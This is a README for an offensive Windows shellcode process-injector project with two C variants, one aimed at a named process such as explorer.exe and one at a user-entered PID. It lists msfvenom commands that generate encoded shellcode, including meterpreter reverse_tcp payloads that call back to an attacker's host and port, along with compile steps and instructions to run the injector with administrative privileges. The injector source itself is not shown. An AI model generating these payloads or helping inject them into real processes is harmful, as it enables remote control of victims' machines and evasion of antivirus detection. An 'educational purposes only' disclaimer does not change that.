# Shellcode Process Injector

This project contains two variants of a shellcode injector for Windows that injects shellcode into a specified target process. The two versions differ in how they identify the target process for injection: one uses a hardcoded process name, and the other allows the user to specify a process ID (PID) at runtime.

## Variants

1. **Shellcode_ProcessInjector_auto.c**
   - This variant injects shellcode into a target process specified by changing the `processName` variable in the code.
   - Example target process: `explorer.exe`
   - Shellcode used to open `calc.exe`:
     ```c
     //msfvenom -p windows/x64/exec cmd=calc.exe -f c -e x64/zutto_dekiru
     ```
   - Shellcode for `meterpreter/reverse_tcp` (64-bit):
     ```c
     //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<hostIP> LPORT=<hostPORT> -f c -e x64/zutto_dekiru
     ```

2. **Shellcode_ProcessInjector_manual.c**
   - This variant allows the user to specify the target process at runtime by entering its PID.
   - Example shellcode used to open `calc.exe` on a 32-bit application:
     ```c
     //msfvenom -p windows/exec cmd=calc.exe -f c -e x86/shikata_ga_nai -b "\x00\x0A\x0D" --smallest
     ```
   - Shellcode for `meterpreter/reverse_tcp` (32-bit):
     ```c
     //msfvenom -p windows/meterpreter/reverse_tcp LHOST=<hostIP> LPORT=<hostPORT> -f c -e x86/shikata_ga_nai
     ```
   - Shellcode for `meterpreter/reverse_tcp` (64-bit):
     ```c
     //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<hostIP> LPORT=<hostPORT> -f c -e x64/zutto_dekiru
     ```

## Requirements

- Windows OS
- Visual Studio or a compatible C compiler
- `msfvenom` from the Metasploit Framework

## Compilation

To compile the variants, use the following command:

```bash
gcc -o Shellcode_ProcessInjector_auto Shellcode_ProcessInjector_auto.c
gcc -o Shellcode_ProcessInjector_manual Shellcode_ProcessInjector_manual.c

## Usage

### Shellcode_ProcessInjector_auto
1. Open the source file and modify the `processName` variable to target the desired process.
2. Compile the program.
3. Run the executable with administrative privileges.

### Shellcode_ProcessInjector_manual
1. Compile the program.
2. Run the executable and enter the PID of the target process when prompted.

## Notes
- Ensure that the target process is running before injecting shellcode.
- Use caution when running this program as it injects code into another process, which can lead to unexpected behavior.
- This code is intended for educational purposes only. Ensure you have permission to test on any target processes.

